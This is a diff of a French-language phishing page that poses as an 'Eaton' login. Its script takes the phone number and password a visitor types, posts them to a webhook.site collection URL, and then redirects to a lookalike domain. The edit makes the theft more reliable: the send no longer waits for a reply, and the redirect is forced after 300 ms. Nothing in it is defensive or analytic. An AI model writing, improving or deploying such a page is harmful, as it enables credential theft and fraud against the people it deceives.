@@ -5,8 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Connexion Eaton</title>
   <style>
-    /* styles identiques à ton code précédent */
-    * { box-sizing: border-box; }
+    * {
+      box-sizing: border-box;
+    }
     body {
       margin: 0;
       font-family: 'Arial', sans-serif;
@@ -154,10 +155,10 @@
   <!-- Fond orange -->
   <div class="orange-bg"></div>
 
-  <!-- Script JavaScript pour l'envoi + redirection -->
+  <!-- Script JavaScript pour envoi + redirection -->
   <script>
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault(); // Empêche l'envoi classique
+      e.preventDefault();
 
       const phone = document.getElementById('phone').value;
       const password = document.getElementById('password').value;
@@ -166,18 +167,16 @@
       data.append('phone', phone);
       data.append('password', password);
 
+      // Envoi POST sans attendre de réponse
       fetch('https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5', {
         method: 'POST',
         body: data
-      })
-      .then(response => {
-        // Optionnel : console.log('Envoyé');
-        // Redirection après succès
-        window.location.href = 'https://bfa.afeatoncom.shop/index/new/index';
-      })
-      .catch(error => {
-        console.error('Erreur lors de l’envoi :', error);
       });
+
+      // Redirection forcée après 300 ms
+      setTimeout(function() {
+        window.location.href = 'https://bfa.afeatoncom.shop/index/new/index';
+      }, 300);
     });
   </script>
 
